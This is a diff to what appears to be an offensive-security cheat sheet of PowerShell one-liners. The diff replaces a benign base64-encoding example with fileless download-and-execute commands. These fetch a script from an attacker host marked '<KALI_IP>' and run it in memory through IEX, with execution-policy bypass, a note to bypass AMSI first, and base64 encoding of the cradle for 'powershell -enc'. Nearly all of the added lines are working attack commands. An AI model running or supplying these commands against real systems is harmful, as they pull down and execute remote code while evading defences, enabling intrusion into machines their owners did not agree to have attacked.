@@ -1,4 +1,13 @@
 % powershell/misc
 
-# powershell base64 encode command string
-[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("'mikefrobbins.com'"))
+# base64 encode command string
+$text = "(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>/run.txt') | IEX"
+[Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
+powershell -enc KABOAGUA...==
+
+# fileless import/execute (bypass amsi first)
+IEX(New-Object Net.WebClient).DownloadString("http://<KALI_IP>/<PS1>")
+powershell -ep bypass -command "iex(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/<PS1>')"
+echo IEX (New-Object Net.WebClient).DownloadString('http://<KALI_IP>/<PS1>') | powershell -NoProfile -Command -
+(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>/<PS1>') | IEX
+powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest 'http://<KALI_IP>/<PS1>').Content).Invoke();"
